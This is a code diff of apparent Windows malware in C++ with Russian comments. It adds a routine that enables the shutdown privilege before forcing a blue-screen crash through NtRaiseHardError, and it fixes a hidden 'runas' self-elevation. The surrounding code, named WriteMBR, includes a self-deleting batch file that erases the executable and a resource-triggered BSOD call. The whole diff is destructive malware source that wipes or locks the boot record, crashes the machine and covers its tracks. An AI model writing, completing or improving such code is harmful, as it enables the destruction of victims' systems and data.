@@ -31,6 +31,27 @@ bool IsAdmin() {
 }
 
 // ============================================================
+// ВКЛЮЧЕНИЕ ПРИВИЛЕГИИ ДЛЯ BSOD
+// ============================================================
+void EnableShutdownPrivilege() {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return;
+    
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    if (!LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &luid))
+        return;
+    
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+}
+
+// ============================================================
 // ВЫЗОВ BSOD
 // ============================================================
 void TriggerBSOD() {
@@ -49,6 +70,8 @@ void TriggerBSOD() {
     NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
     if (!NtRaiseHardError) return;
     
+    EnableShutdownPrivilege();
+    
     ULONG_PTR params[4] = {0};
     ULONG response = 0;
     
@@ -66,10 +89,14 @@ void TriggerBSOD() {
 // ПОВЫШЕНИЕ ПРАВ
 // ============================================================
 void ElevateAndRun() {
+    char szPath[MAX_PATH];
+    GetModuleFileNameA(NULL, szPath, MAX_PATH);
+    
     SHELLEXECUTEINFOA sei = {0};
     sei.cbSize = sizeof(sei);
     sei.lpVerb = "runas";
-    sei.lpFile = GetCommandLineA();
+    sei.lpFile = szPath;
+    sei.lpParameters = lpCmdLine;
     sei.nShow = SW_HIDE;
     
     if (ShellExecuteExA(&sei)) {
@@ -145,7 +172,7 @@ void WriteMBR() {
     std::string batPath = std::string(szPath) + ".bat";
     std::ofstream bat(batPath.c_str());
     bat << "@echo off\n";
-    bat << "timeout /t 1 /nobreak > nul\n";
+    bat << "ping 127.0.0.1 -n 2 > nul\n";  // Работает везде
     bat << "del \"" << szPath << "\"\n";
     bat << "del \"" << batPath << "\"\n";
     bat.close();
@@ -160,7 +187,6 @@ void WriteMBR() {
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
     // --- BSOD (если есть маркер в ресурсах) ---
-    // Ищем ресурс "BSOD" типа RT_RCDATA (стандартный тип для бинарных данных)
     if (FindResourceA(NULL, "BSOD", RT_RCDATA)) {
         TriggerBSOD();
     }
